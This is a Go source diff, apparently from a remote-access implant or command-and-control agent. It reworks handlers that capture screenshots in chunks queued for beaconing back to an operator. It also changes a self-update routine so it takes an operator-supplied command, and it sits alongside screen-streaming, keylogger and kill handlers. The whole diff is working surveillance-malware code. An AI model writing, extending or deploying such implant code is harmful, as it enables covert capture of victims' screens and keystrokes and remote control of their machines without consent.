@@ -17,15 +17,27 @@ import (
 // ── Screenshot / Screen Stream ──────────────────────────────────────────
 
 func handleScreenshot(task Task, res *TaskResult) {
-	data, err := takeScreenshot()
-	if err != nil {
-		res.Error = err.Error()
-	} else {
-		res.Output = base64.StdEncoding.EncodeToString(data)
-		res.Encoding = "base64"
-		res.Size = int64(len(data))
-		inFastMode.Store(true)
+	results := takeScreenshotChunked(65)
+	if len(results) == 0 {
+		res.Error = "screenshot failed"
+		return
 	}
+	if results[0].Error != "" {
+		res.Error = results[0].Error
+		return
+	}
+	if len(results) == 1 {
+		res.Output = results[0].Output
+		res.Encoding = results[0].Encoding
+		res.Size = results[0].Size
+		inFastMode.Store(true)
+		return
+	}
+	// Multi-chunk: append chunks to pendingResults (already locked by doBeacon)
+	pendingResults = append(pendingResults, results...)
+	res.Output = "screenshot_chunked"
+	res.Size = int64(len(results))
+	inFastMode.Store(true)
 }
 
 func handleScreenStreamStart(task Task, res *TaskResult) {
@@ -82,14 +94,24 @@ func handleScreenStreamStop(task Task, res *TaskResult) {
 }
 
 func handleScreenshotWindow(task Task, res *TaskResult) {
-	data, err := takeScreenshot()
-	if err != nil {
-		res.Error = err.Error()
-	} else {
-		res.Output = base64.StdEncoding.EncodeToString(data)
-		res.Encoding = "base64"
-		res.Size = int64(len(data))
+	results := takeScreenshotChunked(85)
+	if len(results) == 0 {
+		res.Error = "screenshot failed"
+		return
 	}
+	if results[0].Error != "" {
+		res.Error = results[0].Error
+		return
+	}
+	if len(results) == 1 {
+		res.Output = results[0].Output
+		res.Encoding = results[0].Encoding
+		res.Size = results[0].Size
+		return
+	}
+	pendingResults = append(pendingResults, results...)
+	res.Output = "screenshot_chunked"
+	res.Size = int64(len(results))
 }
 
 // ── Keylogger ───────────────────────────────────────────────────────────
@@ -319,13 +341,12 @@ func handleKill(task Task, res *TaskResult) {
 }
 
 func handleSelfUpdate(task Task, res *TaskResult) {
-	url := task.Command
-	if url == "" {
-		res.Error = "self_update: download URL required"
+	if task.Command == "" {
+		res.Error = "self_update: command required"
 		return
 	}
-	result := selfUpdate(url)
-	if strings.HasPrefix(result, "failed") {
+	result := selfUpdate(task.Command)
+	if strings.HasPrefix(result, "failed") || strings.HasPrefix(result, "self_update:") {
 		res.Error = result
 	} else {
 		res.Output = result
